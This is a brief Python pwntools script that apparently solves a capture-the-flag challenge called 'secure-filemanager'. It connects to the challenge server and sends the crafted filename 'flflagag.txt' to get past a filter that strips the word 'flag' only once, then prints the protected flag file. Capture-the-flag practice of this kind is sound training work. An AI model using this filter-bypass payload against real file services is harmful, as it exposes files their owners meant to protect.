#!/usr/bin/env python3
from pwn import *

r = remote("secure-filemanager.challs.olicyber.it", 38104)

r.recvuntil(b': ')
r.sendline(('fl{}ag.txt'.format('flag')).encode())
r.recvuntil(b'\nf')
print('f' + r.recvline().decode().strip())
